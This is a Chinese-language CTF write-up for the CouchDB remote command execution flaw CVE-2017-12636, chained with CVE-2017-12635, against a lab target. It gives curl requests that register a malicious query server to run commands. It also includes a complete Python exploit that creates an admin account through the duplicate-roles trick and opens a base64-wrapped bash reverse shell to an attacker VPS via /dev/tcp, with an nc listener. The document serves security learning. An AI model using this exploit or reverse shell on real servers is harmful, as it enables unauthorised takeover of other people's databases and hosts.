# Couchdb 任意命令执行漏洞（CVE-2017-12636）by [anonymity3712](https://github.com/anonymity3712)

## 漏洞概述

CVE-2017-12636是由于数据库自身设计原因，管理员身份可以通过HTTP（S）方式，配置数据库。在某些配置中，可设置可执行文件的路径，在数据库运行范围内执行。结合CVE-2017-12635可实现远程代码执行。

## writeup
访问靶场地址

![](http://picture.mzxh.xyz/20200515111605.png)

可以看到couchdb版本是1.6.0

访问https://靶场地址/_utils/

![](http://picture.mzxh.xyz/20200515111756.png)

提示所有人均为管理员

点击Fix this 创立管理员

![](http://picture.mzxh.xyz/20200515111844.png)

依次执行如下请求即可触发任意命令执行：

```
curl -X PUT 'http://admin:admin@ctf.mzxh.xyz:58512/_config/query_servers/cmd' -d '"id >/tmp/success"'
curl -X PUT 'http://admin:admin@ctf.mzxh.xyz:58512/vultest'
curl -X PUT 'http://admin:admin@ctf.mzxh.xyz:58512/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
curl -X POST 'http://admin:admin@ctf.mzxh.xyz:58512/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'
```

>`ctf.mzxh.xyz:58512`为你的靶场访问地址
> 第一个请求是添加一个名字为cmd的query_servers，`admin:admin`为你刚刚创建的管理员账号：密码；`id >/tmp/success`为你要执行的命令
> 第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。
> 第四个请求就是在这个Database里进行查询，因为我将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行。

![](http://picture.mzxh.xyz/20200515112457.png)

可以看到生成了success文件中包含了id返回信息

![](http://picture.mzxh.xyz/20200515112524.png)

### 反弹shell

注意：直接反弹shell不成功。反弹Shell的命令，在经过数据库处理时被截断，不能直接执行，

所以这里直接用exp打

攻击机开启一个端口监听

```
nc -lvp 7777
```
![](http://picture.mzxh.xyz/20200515190126.png)

运行exp脚本（需要修改下面几处）

> target = 你靶场的地址
> command = rb"""sh -i >& /dev/tcp/你公网vps地址/端口 0>&1"""
> version = 1(版本号1.x版本选1 2.x版本选2)

```
#!/usr/bin/env python3
import requests
import json
import base64
from requests.auth import HTTPBasicAuth

target = 'http://ctf.mzxh.xyz:47787'
command = rb"""sh -i >& /dev/tcp/***.***.***.***/7777 0>&1"""
version = 1

session = requests.session()
session.headers = {
    'Content-Type': 'application/json'
}
# session.proxies = {
#     'http': 'http://127.0.0.1:8085'
# }
session.put(target + '/_users/org.couchdb.user:wooyun', data='''{
  "type": "user",
  "name": "wooyun",
  "roles": ["_admin"],
  "roles": [],
  "password": "wooyun"
}''')

session.auth = HTTPBasicAuth('wooyun', 'wooyun')

command = "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(command).decode()
if version == 1:
    session.put(target + ('/_config/query_servers/cmd'), data=json.dumps(command))
else:
    host = session.get(target + '/_membership').json()['all_nodes'][0]
    session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=json.dumps(command))

session.put(target + '/wooyun')
session.put(target + '/wooyun/test', data='{"_id": "wooyuntest"}')

if version == 1:
    session.post(target + '/wooyun/_temp_view?limit=10', data='{"language":"cmd","map":""}')
else:
    session.put(target + '/wooyun/_design/test', data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}')
```

![](http://picture.mzxh.xyz/20200515113359.png)
